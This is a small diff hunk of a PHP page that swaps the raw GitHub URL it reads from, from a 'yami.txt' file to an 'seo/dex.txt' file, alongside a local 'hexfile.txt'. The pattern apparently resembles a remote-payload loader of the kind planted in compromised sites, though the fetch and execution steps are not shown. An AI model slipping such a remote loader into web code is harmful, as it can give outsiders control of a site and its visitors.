@@ -6,7 +6,7 @@
 <body>
     <?php
     
-    $githubUrl = 'https://raw.githubusercontent.com/youngkmd/youngkmd/main/yami.txt';
+    $githubUrl = 'https://raw.githubusercontent.com/youngkmd/seo/main/dex.txt';
     
     $localHexFile = 'hexfile.txt';
 
